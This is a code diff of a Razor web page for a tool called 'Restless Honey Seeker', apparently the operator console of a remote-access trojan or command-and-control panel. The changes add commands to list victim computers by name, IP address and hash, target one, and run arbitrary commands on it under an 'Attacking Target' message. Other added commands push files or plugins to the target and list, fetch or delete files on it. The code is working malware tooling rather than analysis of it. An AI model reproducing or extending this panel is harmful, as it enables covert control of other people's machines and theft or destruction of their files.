@@ -1,25 +1,27 @@
 ﻿@{
     ViewBag.Title = "Restlesss Honey Seeker";
 }
-<div class="row">
+@Styles.Render("~/Content/jquery.console.blink.css")
+@Styles.Render("~/Content/jquery.console.custom.css")
+@*<div class="row">
     <div class="col-md-12">
         <div id="containerDiv">...</div>
     </div>
-</div>
+</div>*@
 <div class="row">
-    <div class="col-md-12">
-        <div class="form-group">
-            <label for="computer">Upload</label>
-            <form role="form" class="form-inline">
-                <select id="uploadType" class="form-control">
-                    <option value="@Library.ECommand.DOWNLOAD_FILE">File</option>
-                    <option value="@Library.ECommand.UPLOAD_PLUGIN">Plugin</option>
-                </select>
-                <input id="files" type="file" />
-            </form>
+        <div class="col-md-12">
+            <div class="form-group">
+                @*<label for="computer">Upload</label>*@
+                <form role="form" class="form-inline">
+                    @*<select id="uploadType" class="form-control">
+                        <option value="@Library.ECommand.UploadFile">File</option>
+                        <option value="@Library.ECommand.UploadPlugin">Plugin</option>
+                    </select>*@
+                    <input id="files" type="file" />
+                </form>
+            </div>
         </div>
     </div>
-</div>
 <div class="row">
     <div class="col-md-12">
         <div class="console"></div>
@@ -33,9 +35,9 @@
 
         $('input[type="file"]').change(function () {
             //alert("uploading");
-            //commands['upload']("file", function (result) {
-            //    //alert("OK");
-            //});
+            commands['upload']("file", function (result) {
+                //alert("OK");
+            });
         });
 
         var console = $('.console');
@@ -58,7 +60,7 @@
             },
             animateScroll: true,
             promptHistory: true,
-            welcomeMessage: "Type 'help' for a list of commands"
+            welcomeMessage: "Restless Honey Seeker [Version 2016.2.4]\r\nType 'help' for a list of commands"
         });
         //controller.promptText('5 * 4');
     });
@@ -67,13 +69,26 @@
         var inputSplit = input.split(' ');
         var command = inputSplit.length > 0 ? inputSplit[0] : null;
         var parameters = inputSplit.length > 1 ? inputSplit.slice(1, inputSplit.length) : null;
-        if (command && typeof commands[command] === 'function') {
-            commands[command](parameters, onSuccess);
+        if (command) {
+            if (typeof commands[command] === 'function') {
+                commands[command](parameters, onSuccess);
+            }
+            else {
+                commands['run'](command, parameters, onSuccess);
+            }
         }
     }
 
     var computers = [],
+        files = [],
         currentTarget = null;
+    var serverCommands = [
+        { 'name': 'help', 'desc': '' },
+        { 'name': 'cmd', 'desc': 'List of client commands' },
+        { 'name': 'list', 'desc': 'List of client computers' },
+        { 'name': 'clear', 'desc': 'Clear console input' },
+        { 'name': 'target', 'desc': '' }
+    ];
 
     var returnResult = [];
 
@@ -90,50 +105,37 @@
 
     var commands = {
         upload: function (parameters, onSuccess) {
-            var data = new FormData();
             var files = $("#files").get(0).files;
-            var command = '@Library.ECommand.DOWNLOAD_FILE';
-            if (files.length > 0) {
-                if (parameters.length == 1) {
-                    var param1 = ('' + parameters[0]).toLowerCase();
-                    switch (param1) {
-                        case 'file':
-                            command = '@Library.ECommand.DOWNLOAD_FILE';
-                            break;
-                        case 'plugin':
-                            command = '@Library.ECommand.UPLOAD_PLUGIN';
-                            break;
-                    }
+            if (currentTarget) {
+                if (files && files.length > 0) {
+                    var fileName = files[0]['name'];
+                    addLine("Uploading file '" + fileName + "'...");
+                    var data = new FormData();
+                    data.append("UploadedFile", files[0]);
+                    $.ajax({
+                        type: 'POST',
+                        url: '/Home/UploadFile',
+                        contentType: false,
+                        processData: false,
+                        data: data,
+                        success: function (data) {
+                            addLine("Done uploading file!");
+                            controller.report(getResult());
+                            editSettings('@Library.ECommand.UploadFile', fileName, "");
+                        }
+                    });
                 }
-                var fileName = files[0]['name'];
-                addLine("Uploading file: " + fileName);
-                data.append("UploadedFile", files[0]);
-                var req = $.ajax({
-                    type: 'POST',
-                    url: '/Home/UploadFile',
-                    contentType: false,
-                    processData: false,
-                    data: data
-                });
-                req.done(function (xhr, status) {
-                    if (status == 'success') {
-                        addLine("Done uploading!");
-                        onSuccess(getResult());
-                        //var file = $("#files").val();
-                        //alert(file + " - " + files[0]['name']);
-                        editSettings(command, fileName, '', 0, 0, "");
-                    }
-                });
             }
-            onSuccess(getResult());
+            else {
+                noTarget();
+                controller.report(getResult());
+            }
         },
         help: function (parameters, onSuccess) {
             addLine("Available server commands:");
-            addLine("help", true);
-            addLine("cmd (shows a list of client commands)", true);
-            addLine("list (shows a list of clients)", true);
-            addLine("clear (clear input)", true);
-            addLine("target", true);
+            $.each(serverCommands, function (k, v) {
+                addLine(getCommandDescription(v), true);
+            });
             onSuccess(getResult());
         },
         cmd: function (parameters, onSuccess) {
@@ -146,20 +148,6 @@
                 onSuccess(getResult());
             });
         },
-        list: function (parameters, onSuccess) {
-            addLine("Available computers:");
-            $.getJSON('/Home/GetComputers').done(function (data) {
-                computers = [];
-                var dataParsed = JSON.parse(data);
-                //console.log(computers);
-                $.each(dataParsed, function (k, v) {
-                    //console.log(v);
-                    computers.push({ id: "" + k, val: v });
-                    addLine(k + ": " + getComputerDescription(v), true);
-                });
-                onSuccess(getResult());
-            });
-        },
         clear: function (parameters, onSuccess) {
             controller.reset();
             addLine("Type 'help' for a list of commands.", "white");
@@ -168,31 +156,66 @@
         cls: function (parameters, onSuccess) {
             commands["clear"]();
         },
-        attack: function (parameters, onSuccess) {
+        get: function (parameters, onSuccess) {
+            var file = getSelectedFile(parameters);
+            if (currentTarget && file) {
+                window.open('/Home/GetFile?computerHash=' + currentTarget['Hash'] + '&file=' + file);
+            }
+        },
+        rm: function (parameters, onSuccess) {
+            var file = getSelectedFile(parameters);
+            if(currentTarget && file) {
+                $.post('/Home/DeleteFile', { 'computerHash' : currentTarget['Hash'], 'filename' : file }, function (result) {
+                    console.log("result: " + result);
+                }, "json");
+            }
+        },
+        ls: function (parameters, onSuccess) {
             if (currentTarget) {
+                $.ajax({
+                    url: '/Home/GetFilesInDir?computerHash=' + currentTarget['Hash'],
+                    dataType: 'text',
+                    success: function (data) {
+                        var json = JSON.parse(data);
+                        files = [];
+                        $.each(json, function (k, v) {
+                            files.push({ id: "" + k, val: v });
+                            addLine(k + ": " + v);
+                        });
+                        //console.log(json);
+                        onSuccess(getResult());
+                    }
+                });
+            }
+            else {
+                noTarget();
+                onSuccess(getResult());
+            }
+        },
+        run: function (command, parameters, onSuccess) {
+            if (currentTarget) {
+
                 addLine("Attacking Target: '" + getComputerDescription(currentTarget) + "'.");
+                addLine("Command: " + command);
+                var pars = "";
                 if (parameters && parameters.length >= 1) {
-                    var command = parameters[0];
-                    var parsArray = parameters.slice(1, parameters.length);
-                    var pars = "";
+                    var parsArray = parameters;
                     for (var i = 0; i < parsArray.length; i++) {
                         pars += parsArray[i] + " ";
                     }
                     pars = pars.trim();
-                    addLine("Command: " + command);
-                    addLine("Parameters: " + pars);
-                    editSettings(command, "", pars, 0, 0, "");
-                    getStatus(onSuccess);
                 }
-                //var command = $('#command').find(':selected').val();
-                //var file = $('#FileName').val();
-                //var parameters = $('#Parameters').val();
-                //editSettings(command, file, parameters, cursorX, cursorY, "");
-                //currentTarget = null;
+                addLine("Parameters: " + pars);
+                editSettings(command, pars, "");
+                getStatus(onSuccess);
             } else {
-                addLine("No target selected... Use 'list' to see a list of computers.");
+                noTarget();
             }
             onSuccess(getResult());
+        },
+        attack: function (parameters, onSuccess) {
+            var command = parameters.length >= 1 ? parameters[0] : null;
+            commands.run(command, parameters.slice(1, parameters.length), onSuccess);
         },
         target: function (parameters, onSuccess) {
             if (parameters) {
@@ -202,9 +225,6 @@
                         addLine("Target '" + getComputerDescription(currentTarget) + "' removed.");
                         currentTarget = null;
                     }
-                        //else if (param1.substr(0, 4) == 'exec') {
-
-                        //}
                     else {
                         var obj = _.findWhere(computers, { 'id': param1 });
                         if (obj && obj['val']) {
@@ -213,20 +233,37 @@
                         }
                     }
                 }
-                //for (var i = 0; i < parameters.length; i++) {
-                //    addLine("Parameters: " + parameters[i]);
-                //}
             }
             else {
                 if (currentTarget) {
                     addLine("Current Target: " + getComputerDescription(currentTarget));
                 }
                 else {
-                    addLine("No target selected... Use 'list' to see a list of computers.");
+                    noTarget();
+                    addLine("");
+                    addLine("Available computers:");
+                    $.getJSON('/Home/GetComputers').done(function (data) {
+                        computers = [];
+                        var dataParsed = JSON.parse(data);
+                        $.each(dataParsed, function (k, v) {
+                            computers.push({ id: "" + k, val: v });
+                            addLine(k + ": " + getComputerDescription(v), true);
+                        });
+                        onSuccess(getResult());
+                    });
                 }
             }
             onSuccess(getResult());
         }
+    }
+
+    function getSelectedFile(parameters) {
+        var file = files && parameters && parameters.length === 1 ? files[parameters] : null;
+        return file ? file['val'] : null;
+    }
+
+    function noTarget() {
+        addLine("No target selected...\r\n");//Use 'list' to see a list of computers.");
     }
 
     var psChecker;
@@ -236,27 +273,37 @@
         onSuccess(getResult());
         psChecker = setInterval(function () {
             $.ajax({
-                url: '/api/rhs/getsettings',
+                url: '/api/rhs/getsettings', // returns settings.json
                 dataType: 'text',
-                success: function (text) {
-                    var json = JSON.parse(text);
-                    //console.log(json['ComputerHash']);
+                success: function (data) {
+                    var json = JSON.parse(data);
                     if (currentTarget != null) {
                         if (json['ComputerHash'] == null) {
                             clearInterval(psChecker);
-                            $("#containerDiv").text("done!");
-                            $.ajax({
-                                url: '/Home/GetFile?computerHash=' + currentTarget['Hash'] + '&file=result.txt',
-                                dataType: 'text',
-                                success: function (result) {
-                                    //currentTarget = null;
-                                    addLine(result);
+                            //$("#containerDiv").text("done! File: " + json['OutputFile']);
+                            if (json['OutputFile']) {
+                                if (json['CanDisplayFileContents']) {
+                                    $.ajax({
+                                        url: '/Home/GetFile?computerHash=' + currentTarget['Hash'] + '&file=' + json['OutputFile'],
+                                        dataType: 'text',
+                                        success: function (result) {
+                                            //currentTarget = null;
+                                            addLine(result);
+                                            onSuccess(getResult());
+                                        }
+                                    });
+                                } else {
+                                    addLine("Finished executing");
                                     onSuccess(getResult());
                                 }
-                            });
+                            }
+                            else {
+                                addLine("Finished executing");
+                                onSuccess(getResult());
+                            }
                         }
                         else {
-                            $("#containerDiv").text("working...");
+                            //$("#containerDiv").text("working...");
                         }
                     }
                 }
@@ -264,33 +311,31 @@
         }, 500);
     }
 
+    function getCommandDescription(command) {
+        return command['name'] + (command['desc'] ? " (" + command['desc'] + ")" : "");
+    }
 
-    function getComputerDescription(v) {
-        if (v) {
-            return v['Name'] + " (" + v['IpExternal'] + ")";
+    function getComputerDescription(computer) {
+        if (computer) {
+            console.log(computer);
+            return computer['Name'] + ", IP ext.: " + computer['IpExternal'] + ", IP int.: " + computer['IpInternal'] + ", Hash: " + computer['Hash'];
         }
         return "No computer selected";
     }
 
-    function editSettings(command, file, parameters, cursorX, cursorY, keyCode) {
-        console.log(currentTarget);
+    function editSettings(command, parameters, file) {
         if (currentTarget) {
             var data = {
                 'ComputerHash': currentTarget['Hash'],
                 'Command': command,
                 'File': file,
                 'Parameters': parameters,
-                //'HasExectuted': false,
-                'cursorX': cursorX,
-                'cursorY': cursorY,
-                'keyCode': keyCode
+                //'cursorX': cursorX,
+                //'cursorY': cursorY,
+                //'keyCode': keyCode
             };
-            //alert(data['computerHash']);
             $.post('/api/RHS/SaveSettings', data, function (result) {
-                console.log("result: " + result);
-                //setTimeout(function () {
-                //    $("#data").html("<a target='_blank' href='/Home/GetFile?file=" + fileToOpen + "'>open</a>");
-                //}, 7000);
+                //console.log("result: " + result);
             }, "json");
             //.fail(function (data) {
             //    console.log('failed');
@@ -298,52 +343,6 @@
         }
     }
 </script>
-<style type="text/css" media="screen">
-    div.console {
-        font-size: 14px;
-        line-height: 20px;
-        margin-top: 1em;
-        color: #FFF;
-        font-family: 'Lucida Console', Consolas, 'Courier New', monospace;
-        word-wrap: break-word;
-    }
-
-        div.console div.jquery-console-inner {
-            width: 98%;
-            height: 400px;
-            background: #000;
-            padding: 0.5em;
-            overflow: auto;
-        }
-
-        div.console div.jquery-console-prompt-box {
-            color: #fff;
-            font-family: monospace;
-        }
-
-        div.console div.jquery-console-focus span.jquery-console-cursor {
-            background: #333;
-            color: #eee;
-            font-weight: bold;
-        }
-
-        div.console div.jquery-console-message-error {
-            color: #ef0505;
-            font-family: sans-serif;
-            font-weight: bold;
-            padding: 0.1em;
-        }
-
-        div.console div.jquery-console-message-success {
-            color: #187718;
-            font-family: monospace;
-            padding: 0.1em;
-        }
-
-        div.console span.jquery-console-prompt-label {
-            font-weight: bold;
-        }
-</style>
 <noscript>
     <p>
         <strong>Please enable JavaScript or upgrade your browser.</strong>
